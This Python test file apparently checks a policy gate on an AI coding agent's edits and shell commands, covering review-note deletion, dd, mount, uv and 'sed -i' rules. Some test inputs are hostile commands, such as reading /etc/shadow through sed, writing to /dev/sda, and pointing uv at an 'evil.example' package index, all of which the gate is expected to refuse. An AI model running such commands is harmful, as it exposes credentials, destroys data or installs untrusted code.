    """A concern's grant skips the new-devtools ask and nothing adjacent."""
    rule = PathRule(
        kind="new_devtools",
        value="src",
        reason="new devtools module requires approval",
    )
    creation = EditBatch(
        changes=[
            EditChange(
                path=Path("src/app/devtools/harness/content/docs/newborn.py"),
                after='"""Newborn."""\n',
            )
        ]
    )
    ungranted = EditPolicy(protected=[rule], autonomous=True).decide(creation)
    assert ungranted.effect == "ask"
    assert "new devtools module" in ungranted.reason
    granted = EditPolicy(
        protected=[rule],
        autonomous=True,
        grants=granting(tmp_path, ConcernAllowance.NEW_DEVTOOLS_MODULE),
    )
    assert granted.decide(creation).effect == "allow"


def test_fragment_edits_are_judged_as_the_documents_they_produce(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A marker mentioned inside a string literal is prose, not feedback.

    The path is repo-relative because the session scratchpad is exempt from
    the marker gate by role, and the gate is what this test drives. The
    fragment strips the marker off a line that survives, which is a deletion
    under any reading — so what separates the two answers is only whether the
    text is seen as a document, which is the point.
    """
    monkeypatch.chdir(tmp_path)
    Path("content.py").write_text(
        'TABLE = """\nA note spells itself as # lup: fix this here.\n"""\n',
        encoding="utf-8",
    )
    fragment = EditBatch(
        changes=[
            EditChange(
                path=Path("content.py"),
                before="A note spells itself as # lup: fix this here.\n",
                after="A note spells itself as\n",
            )
        ]
    )
    policy = EditPolicy(protected=[])
    assert policy.decide(fragment).effect == "deny"
    assert policy.decide(fragment.as_documents()).effect == "allow"


def test_semantic_policy_threads_allowances_into_the_edit_gate(
    tmp_path: Path,
) -> None:
    """The composed policy honours the same grants the dispatchers read."""
    creation = EditBatch(
        changes=[
            EditChange(
                path=Path("src/app/devtools/newborn.py"),
                after='"""Newborn."""\n',
            )
        ]
    )
    hooks = HookSet(id="test", policy_ids=["edit"])
    withheld = semantic_policy_for(hooks, autonomous=True)
    assert withheld.decide(creation).effect == "ask"
    released = semantic_policy_for(
        hooks,
        autonomous=True,
        grants=granting(tmp_path, ConcernAllowance.NEW_DEVTOOLS_MODULE),
    )
    assert released.decide(creation).effect == "allow"


def test_removing_a_file_s_last_conflict_marker_is_not_read_as_deleting_a_note() -> (
    None
):
    """Resolving a merge must be able to finish in a file that mentions the marker.

    A conflicted Python file does not tokenize, so the count fell back to a
    whole-text tally that also sees the marker inside ordinary string
    literals. Removing the last conflict marker is what makes the file parse
    for the first time, at which point the count drops to the tokenised
    truth — a difference the gate read as removed feedback, denying the one
    edit that completes any conflict resolution.
    """
    conflicted = (
        "<<<<<<< HEAD\n"
        'MESSAGE = "No unresolved # lup: comments"\n'
        "=======\n"
        'MESSAGE = "No unresolved # lup: comments, and no open issues."\n'
        ">>>>>>> other\n"
    )
    resolved = 'MESSAGE = "No unresolved # lup: comments, and no open issues."\n'

    decision = decide_edit(
        "a.py",
        conflicted,
        resolved,
        path_exists=True,
        path_rules=[],
        antipattern_rows=[],
        allowances=[],
        python_source=True,
    )

    assert "removes inline review feedback" not in decision.reason


def test_a_real_note_deletion_is_still_denied_when_both_sides_parse() -> None:
    """Unknown must widen to no-opinion, not to a hole in the gate."""
    decision = decide_edit(
        "a.py",
        "x = 1  # lup: reconsider this\n",
        "x = 1\n",
        path_exists=True,
        path_rules=[],
        antipattern_rows=[],
        allowances=[],
        python_source=True,
    )

    assert decision.effect == "deny"
    assert "removes inline review feedback" in decision.reason


def marker_effect(before: str, after: str) -> str:
    """What the lattice answers for one edit, with only the marker gate live."""
    return decide_edit(
        "a.py",
        before,
        after,
        path_exists=True,
        path_rules=[],
        antipattern_rows=[],
        allowances=[],
        python_source=True,
    ).effect


def test_a_note_is_spent_by_the_deletion_of_the_code_it_annotated() -> None:
    """Feedback whose subject is gone asks nothing of anybody.

    The gate protects a reader owed an answer. Delete the function a note
    sits on and there is no longer a question outstanding, so refusing the
    deletion only preserves a note about code that is not there — which is
    why deleting annotated code, a whole file, or a block being moved
    elsewhere all have to pass.
    """
    assert (
        marker_effect("# lup: unreachable?\ndef dead():\n    return 1\n", "") == "allow"
    )
    assert (
        marker_effect(
            "# lup: unreachable?\ndef dead():\n    return 1\n\n\ndef live():\n    return 2\n",
            "def live():\n    return 2\n",
        )
        == "allow"
    )
    assert marker_effect("x = 1  # lup: right?\ny = 2\n", "y = 2\n") == "allow"


def test_rewriting_the_annotated_line_does_not_spend_its_note() -> None:
    """Absent is not the same act as deleted.

    Comparing revisions as sets would make editing the code under a note a
    way to drop the note with it — the subject is missing from the new text
    either way. Only a line removed outright spends its feedback; a line
    rewritten in place still carries the question it was asked.
    """
    assert (
        marker_effect(
            "# lup: is this right?\nx = 1\n", "# lup: is this right?\nx = 2\n"
        )
        == "allow"
    )
    assert marker_effect("# lup: is this right?\nx = 1\n", "x = 2\n") == "deny"


def test_a_deletion_hidden_inside_a_conversion_is_still_refused() -> None:
    """Counting notes let one be dropped whenever another was converted.

    Deltas that cancel read as though nothing left: resolve note A, delete
    note B, add note C, and the tally is unchanged while B is gone for good.
    Matching notes by their words is what closes it, and is the reason the
    gate identifies rather than counts.
    """
    assert (
        marker_effect(
            "# lup: note A\nx = 1\n# lup: note B\ny = 2\n",
            "# lup: solved: note A\nx = 1\ny = 2\n# lup: note C\n",
        )
        == "deny"
    )
    assert (
        marker_effect(
            "# lup: note A\nx = 1\n",
            "# lup: solved: note A\nx = 1\n",
        )
        == "allow"
    )


def test_a_declared_checker_naming_the_environment_is_refused() -> None:
    """The layout it spells is the only one it answers for.

    Resolution asks the checkout where its environment is, so a declaration
    that spells `.venv` re-derives the answer and gets it wrong wherever the
    environment sits elsewhere — a redirected `UV_PROJECT_ENVIRONMENT`, a
    conda or pyenv install. There the program resolves to nothing and the
    gate reports no findings, which reads exactly like a clean file.
    """
    with pytest.raises(ValidationError) as refused:
        HookSet(
            id="test",
            policy_ids=["edit"],
            diagnostics_command=[".venv/bin/pyright", "--outputjson"],
        )

    assert "declare 'pyright'" in str(refused.value)


def test_a_declared_resolver_naming_the_environment_is_refused_too() -> None:
    """Both declarations reach the same resolution, so both are held to it."""
    with pytest.raises(ValidationError):
        HookSet(
            id="test",
            policy_ids=["edit"],
            resolution_command=[".venv/bin/lup-devtools", "dev"],
        )


def test_a_vendored_program_may_still_be_declared_by_path() -> None:
    """Naming the environment is refused; naming a location is not.

    A project that keeps a checker at a fixed place of its own means that
    place, and resolution honours it — what it must not do is spell the
    environment, which is the one path resolution already knows how to find.
    """
    hooks = HookSet(
        id="test",
        policy_ids=["edit"],
        diagnostics_command=["tools/mychecker", "--json"],
    )

    assert hooks.diagnostics_command[0] == "tools/mychecker"


def test_one_copy_of_a_duplicated_note_may_go_while_the_text_survives() -> None:
    """A note written twice is one piece of feedback, not two.

    A tally cannot tell a deleted note from a duplicated one being tidied,
    so it denied both — which left a file holding the same note twice unable
    to lose either copy, and froze whatever code carried them.
    """
    decision = decide_edit(
        "a.py",
        "def a() -> None:\n    pass  # lup: solved: check the total\n"
        "def b() -> None:\n    pass  # lup: solved: check the total\n",
        "def a() -> None:\n    pass  # lup: solved: check the total\n",
        path_exists=True,
        path_rules=[],
        antipattern_rows=[],
        allowances=[],
        python_source=True,
    )

    assert "removes a `# lup: solved:` claim" not in decision.reason


def test_losing_the_last_copy_of_a_claim_is_still_denied() -> None:
    """The relaxation is about duplicates, not about claims going missing."""
    decision = decide_edit(
        "a.py",
        "def a() -> None:\n    pass  # lup: solved: check the total\n",
        "def a() -> None:\n    pass\n",
        path_exists=True,
        path_rules=[],
        antipattern_rows=[],
        allowances=[],
        python_source=True,
    )

    assert decision.effect == "deny"
    assert "removes a `# lup: solved:` claim" in decision.reason


def test_dropping_one_of_two_different_notes_is_still_denied() -> None:
    """Two notes that merely sit together are two pieces of feedback."""
    decision = decide_edit(
        "a.py",
        "x = 1  # lup: reconsider this\ny = 2  # lup: and this\n",
        "x = 1  # lup: reconsider this\ny = 2\n",
        path_exists=True,
        path_rules=[],
        antipattern_rows=[],
        allowances=[],
        python_source=True,
    )

    assert decision.effect == "deny"
    assert "removes inline review feedback" in decision.reason


def test_resolving_a_note_into_a_claim_is_still_not_a_deletion() -> None:
    """The open marker goes and the same words return under `solved:`."""
    decision = decide_edit(
        "a.py",
        "x = 1  # lup: reconsider this\n",
        "x = 1  # lup: solved: reconsider this\n",
        path_exists=True,
        path_rules=[],
        antipattern_rows=[],
        allowances=[],
        python_source=True,
    )

    assert "removes inline review feedback" not in decision.reason


def test_a_read_only_form_defined_by_absence_is_recognized_as_a_read() -> None:
    """The negative half of the effect-versus-token gap, closed.

    Every other de-escalation here needs a word to be *present*. `dd` writes
    when handed an `of=` and reads to stdout without one, so its read-only
    form is the invocation carrying nothing extra -- which no membership test
    can name, and which therefore stopped for approval every time.
    """
    policy = ShellPolicy(SHELL_RULES)

    def effect(command: str) -> str:
        return policy.decide(ShellCommand(command=command)).effect

    assert effect("dd if=/etc/hosts") == "allow"
    assert effect("dd if=disk.img bs=1M count=10") == "allow"
    assert effect("dd if=a of=b") == "ask"
    assert effect("dd if=a of=/dev/sda") == "ask"


def test_absence_is_only_concluded_from_words_it_could_actually_read() -> None:
    """A verdict reached from absence has to know it saw everything.

    `dd if=$X` word-splits at expansion, so `$X` holding a space becomes a
    second word that can be `of=`. A test asking whether a marker is missing
    cannot tell that from a marker it could not read, so an illegible word
    keeps the ask -- a stricter bar than the positive tests need, and
    measured allowing until it was raised.
    """
    policy = ShellPolicy(SHELL_RULES)

    def effect(command: str) -> str:
        return policy.decide(ShellCommand(command=command)).effect

    assert effect("dd if=$SOMEVAR") == "ask"
    assert effect("dd if=a of=$X") == "ask"


def test_a_command_that_reads_by_carrying_nothing_is_allowed_carrying_nothing() -> None:
    """Where the line `write_markers` starts ends: a form defined by emptiness.

    `mount` alone prints the mount table, which is how a session finds out what
    its own boundary is made of, and every form that acts names a device or a
    mountpoint. No marker can be found missing because there is no word to look
    in, so the absence of every word is the whole signal.
    """
    policy = ShellPolicy(SHELL_RULES)

    def effect(command: str) -> str:
        return policy.decide(ShellCommand(command=command)).effect

    assert effect("mount") == "allow"
    assert effect("mount -a") == "ask"
    assert effect("mount /dev/sda1 /mnt") == "ask"
    assert effect("mount -t ext4 /dev/sda1 /mnt") == "ask"


def test_carrying_nothing_is_not_read_only_for_a_command_that_acts_on_nothing() -> None:
    """Why emptiness is declared per command rather than inferred from a row.

    `ssh-add` with no words adds the default key, so a rule reading "no
    arguments, therefore nothing happened" would hand over a credential. The
    inference is what is unsafe, which is why only a command that has said so
    gets the allow.
    """
    policy = ShellPolicy(SHELL_RULES)

    def effect(command: str) -> str:
        return policy.decide(ShellCommand(command=command)).effect

    assert effect("ssh-add") != "allow"
    assert effect("dd") != "allow"


def test_asking_git_its_own_version_is_not_an_unclassified_subcommand() -> None:
    """`git version` was allowed and `git --version` denied, for the same question.

    The flag spelling carries no subcommand at all, so it reached the default
    deny and answered "this git subcommand is not classified" about a command
    line holding none.
    """
    policy = ShellPolicy(SHELL_RULES)

    def effect(command: str) -> str:
        return policy.decide(ShellCommand(command=command)).effect

    assert effect("git --version") == "allow"
    assert effect("git --help") == "allow"
    assert effect("git version") == "allow"
    # Still a subcommand-gated command everywhere else. The de-escalation
    # needs *every* argument to be one of the declared flags, so a real
    # subcommand standing beside one would not qualify either.
    assert effect("git gc") == "deny"
    assert effect("git filter-branch") == "deny"
    assert effect("git --exec-path=/x status") == "ask"


def test_editing_a_compiled_plugin_tree_is_refused_by_the_file_gate_too() -> None:
    """The refusal the shell path already gave, given to Edit and Write.

    A plugin tree is a build product: the change is reverted by the next
    generation and never reaches the runtime that already loaded it. The
    shell path said so; an Edit to the same file was judged by the ordinary
    lattice, which has no verdict that is right here — an allow writes
    something about to be overwritten, and an ask puts a question to a human
    whose only correct answer is "edit the source instead".

    Both runtimes' trees, because which tree a write lands in is the same
    question whichever one is running.
    """
    for tree in (".claude", ".codex"):
        decision = decide_edit(
            f"{tree}/plugins/lup/hooks/runtime/policy_data.py",
            "SHELL_RULES = []",
            "SHELL_RULES = [1]",
            path_exists=True,
            path_rules=[],
            antipattern_rows=[],
            python_source=True,
        )
        assert decision.effect == "deny", tree
        assert "compiled from typed source" in decision.reason, tree


def test_a_note_whose_words_stay_in_the_file_was_moved_rather_than_deleted() -> None:
    """Relocating a note is the repair, not the loss.

    A note routinely lands against the wrong declaration — most often in a
    merge, where both sides added at one spot — and the gate read any edit
    dropping the marker line as a deletion. Judged on the words instead: a
    marker whose text still appears in the file has been moved, which makes
    the order the spelling of a move.
    """
    note = "# lup: the base is read from the wrong checkout"
    both = f"{note}\ndef first(): ...\n\n\n{note}\ndef second(): ...\n"
    one = f"def first(): ...\n\n\n{note}\ndef second(): ...\n"

    decision = decide_edit(
        "a.py",
        both,
        one,
        path_exists=True,
        path_rules=[],
        antipattern_rows=[],
        python_source=True,
    )

    assert decision.effect != "deny", decision.reason


def test_a_note_whose_words_leave_the_file_is_still_a_deletion() -> None:
    """The gate that was there all along, unchanged where it was right."""
    note = "# lup: the base is read from the wrong checkout"
    decision = decide_edit(
        "a.py",
        f"{note}\ndef first(): ...\n",
        "def first(): ...\n",
        path_exists=True,
        path_rules=[],
        antipattern_rows=[],
        python_source=True,
    )

    assert decision.effect == "deny"
    assert "removes inline review feedback" in decision.reason
    assert "dev comments --withdraw" in decision.reason


def test_moving_one_note_does_not_cover_deleting_another() -> None:
    """The difference is over the words, so a distinct note is still lost."""
    moved = "# lup: the base is read from the wrong checkout"
    other = "# lup: this counts every concern holding a commit"
    decision = decide_edit(
        "a.py",
        f"{moved}\ndef first(): ...\n\n\n{moved}\n{other}\ndef second(): ...\n",
        f"def first(): ...\n\n\n{moved}\ndef second(): ...\n",
        path_exists=True,
        path_rules=[],
        antipattern_rows=[],
        python_source=True,
    )

    assert decision.effect == "deny"


def test_installing_asks_and_the_verbs_that_fetch_nothing_do_not() -> None:
    """Where the line sits, and that clearing a cache was never on it.

    Fetching a package runs its build code, which is the escape a
    supply-chain compromise arrives through — so both verbs that install ask,
    and the packages having been declared earlier does not answer it, because
    what changed is what the index now serves. Writing a lockfile and
    dropping a dependency fetch nothing to execute, and a cache is rebuilt by
    the command that reads it. That verb reached no rule at all, which is why
    a refresh line asked with it among the reasons.
    """
    policy = ShellPolicy(SHELL_RULES)

    def effect(command: str) -> str:
        return policy.decide(ShellCommand(command=command)).effect

    assert effect("uv add httpx") == "ask"
    assert effect("uv sync --all-extras") == "ask"
    assert effect("uv lock --upgrade-package lup") == "allow"
    assert effect("uv cache clean lup") == "allow"
    assert effect("uv remove ruff") == "allow"


def test_a_verb_pointed_at_another_index_is_not_the_verb_it_rides_on() -> None:
    """Naming a package source is a different act wearing the same word.

    `uv lock` writes what this project declares — while nothing on the
    command line redirects where packages come from, or removes the isolation
    their build code runs in. Either makes the allow wrong, and an unreadable
    word answers the same way, because absence is what is being tested.
    """
    policy = ShellPolicy(SHELL_RULES)

    def effect(command: str) -> str:
        return policy.decide(ShellCommand(command=command)).effect

    assert effect("uv lock") == "allow"
    assert effect("uv lock --index-url http://evil.example/simple") == "ask"
    assert effect("uv lock --extra-index-url http://evil.example/simple") == "ask"
    assert effect("uv lock -f /tmp/wheels") == "ask"
    assert effect("uv lock --no-build-isolation") == "ask"
    assert effect("uv remove ruff --index https://mirror.example") == "ask"
    assert effect("uv lock $FLAGS") == "ask"


def test_a_type_check_through_a_package_runner_is_the_read_it_is() -> None:
    """Both runners name the compiler beneath them, so a verify line passes.

    A verify line ending in `npx tsc --noEmit` asked about its last segment
    and, since segments join, made the whole line ask — a question about
    running the type checker.
    """
    policy = ShellPolicy(SHELL_RULES)

    def effect(command: str) -> str:
        return policy.decide(ShellCommand(command=command)).effect

    for runner in ("npx", "bunx"):
        assert effect(f"{runner} tsc --noEmit") == "allow", runner
        assert effect(f"{runner} tsc --version") == "allow", runner
        # The runner itself still asks: what it fetches is not bounded by the
        # command, and only the compiler is named beneath it.
        assert effect(f"{runner} create-react-app app") == "ask", runner
        assert effect(f"{runner} tsc --outDir build") == "ask", runner

    # Composed the way it was met: segments join, so one asking segment made
    # a whole verify line ask.
    assert effect("git status --short && cd frontend && npx tsc --noEmit") == "allow"


def test_rewriting_a_restorable_file_costs_what_deleting_it_costs(
    tmp_path: Path,
) -> None:
    """An in-place rewrite is judged on its files, the way a delete already is.

    Two objections wore one refusal here, and only one survives a boundary
    beneath it. *Being wrong is unrepairable* is answered by the files: a
    committed file with no uncommitted change costs a checkout and no
    information, and the whole change stands in the diff. *It walks past the
    gates an edit is judged by* is not answered by anything, which is why the
    grant says so and names `dev check`.
    """
    committed_tree(tmp_path, "notes.md", "other.md")
    policy = ShellPolicy(SHELL_RULES, runner_targets=FIXTURE_RUNNER_TARGETS)

    def decided(command: str) -> str:
        return policy.decide(ShellCommand(command=command, cwd=tmp_path)).effect

    assert decided("sed -i 's/body/text/' notes.md") == "allow"
    assert decided("sed -i.bak 's/body/text/' notes.md other.md") == "allow"
    assert decided("sed -ni 's/body/text/p' notes.md") == "allow"

    # A file the host can vouch for nothing about costs whatever was in it.
    (tmp_path / "dirty.md").write_text("uncommitted\n", encoding="utf-8")
    assert decided("sed -i 's/a/b/' dirty.md") == "deny"
    assert decided("sed -i 's/a/b/' absent.md") == "deny"
    # Naming no file at all establishes nothing to be restorable.
    assert decided("sed -i 's/a/b/'") == "deny"
    # A word that names a different path at run time is not established either.
    assert decided("sed -i 's/a/b/' $TARGET") == "deny"


def test_an_in_place_rewrite_never_covers_a_protected_path(tmp_path: Path) -> None:
    """Restorability answers what it costs, never who may replace it."""
    committed_tree(tmp_path, "README.md", "notes.md")
    policy = ShellPolicy(
        SHELL_RULES,
        path_rules=[human_owned_path_rule("README.md")],
        runner_targets=FIXTURE_RUNNER_TARGETS,
    )

    def effect(command: str) -> str:
        return policy.decide(ShellCommand(command=command, cwd=tmp_path)).effect

    assert effect("sed -i 's/a/b/' notes.md") == "allow"
    assert effect("sed -i 's/a/b/' README.md") == "ask"


def test_an_in_place_rewrite_is_still_screened_for_what_the_script_does(
    tmp_path: Path,
) -> None:
    """Recoverability says nothing about a script that writes or executes.

    The two screens are independent: one asks what the named files cost, the
    other what the script reaches. A grant on the first never opens the
    second, which is what keeps `w` and `e` out of an allowed command.
    """
    committed_tree(tmp_path, "notes.md")
    policy = ShellPolicy(SHELL_RULES, runner_targets=FIXTURE_RUNNER_TARGETS)

    def effect(command: str) -> str:
        return policy.decide(ShellCommand(command=command, cwd=tmp_path)).effect

    assert effect("sed -i 's/a/b/w /etc/passwd' notes.md") != "allow"
    assert effect("sed -i '1e cat /etc/shadow' notes.md") != "allow"
    assert effect("sed -i -f script.sed notes.md") == "deny"


def test_every_shell_row_field_reaches_the_generated_data_file() -> None:
    """A column the erasure produces and the renderer drops is a silent gap.

    The generated dispatcher indexes these keys inside a hook, where a missing
    key is a permission that never happens — the one failure shape this
    repository cannot afford to discover in production. So the mapping the
    renderer walks is checked against the shape's own annotations rather than
    trusted to have been updated alongside it.
    """
    row = erase_shell_rules(
        [
            ShellCommandRule(
                name="example", effects=[declare("reads_path", scope="project")]
            )
        ]
    )[0]

    assert set(shell_row_values(row)) == set(ShellRuleRow.__annotations__)


def test_every_runner_target_field_reaches_the_generated_data_file() -> None:
    """The same gap, on the one table a command row cannot reach.

    This shape is smaller and was rendered by a renderer that spelled its
    fields by hand, which is exactly the arrangement that drops a column: the
    row gained `effects` and `refuses` while the renderer still named the
    verdict that had gone.
    """
    row = erase_runner_targets(
        [RunnerTargetRule(name="example", effects=[declare("runs_declared_target")])]
    )[0]

    assert set(runner_target_values(row)) == set(RunnerTargetRow.__annotations__)


def test_a_refused_runner_target_takes_no_native_prefix_allow() -> None:
    """A prefix rule approves before the hook is reached, so it has to agree.

    Codex's native prefix table is read by the runtime itself, and a target
    approved there is approved whatever the dispatcher beside it would have
    said. While a target stated its verdict outright, every declared target
    took a prefix regardless of that verdict — so a project's refusal was
    contradicted by the same declaration that carried it.
    """
    prefixes = codex_allow_prefixes(
        [],
        [
            RunnerTargetRule(name="checker", effects=[declare("runs_declared_target")]),
            RunnerTargetRule(
                name="forecast",
                effects=[declare("runs_declared_target")],
                refuses="forecasts are the user's to run",
            ),
        ],
        excluded_commands=["uv run *"],
    )

    assert ["uv", "run", "checker"] in prefixes
    assert ["uv", "run", "forecast"] not in prefixes


def test_no_row_changes_which_effect_decides_it_when_the_reading_changes() -> None:
    """What `row_verdict` relies on to read a purpose without resolving a path.

    The purpose is the deciding effect's, and `row_verdict` asks for it with no
    evidence in hand — which is exact, not approximate, only while every row in
    the table is decided by the same member under every reading a host could
    supply. A row declaring two effects whose ranking flips on the evidence
    would break that quietly, reporting whichever one an empty reading happened
    to rank first, so the property is held here rather than assumed there.
    """
    placements: list[SandboxPlacement] = ["inside", "outside", "ambient"]
    readings: list[tuple[EffectEvidence, SandboxPlacement]] = [
        (EffectEvidence(contained, tracked, existing, captured), placement)
        for contained, tracked, existing, captured in product([True, False], repeat=4)
        for placement in placements
    ]

    for row in erase_shell_rules(SHELL_RULES):
        deciders = {
            answered.row["kind"]
            for evidence, placement in readings
            for answered in [deciding(row["effects"], evidence, placement)]
            if answered is not None
        }
        assert len(deciders) <= 1, f"{row['rule']} is decided by {sorted(deciders)}"


def test_every_effect_axis_reaches_the_data_file_as_the_type_it_is() -> None:
    """The same gap one level down, where coercing to text reads as harmless.

    An axis rendered with ``str`` arrives as ``"False"``, which the dispatcher
    reads back as a true value — so a write declaring that nothing reviews it
    would be judged as reviewed, and the row this whole table exists for would
    stop refusing anything at all.
    """
    rendered = shell_rule_rows_literal(
        erase_shell_rules(
            [
                ShellCommandRule(
                    name="example",
                    effects=[declare("writes_path", scope="scratch", write="create")],
                )
            ]
        )
    )

    assert '"reviewed": False,' in rendered
    assert '"reviewed": "False",' not in rendered
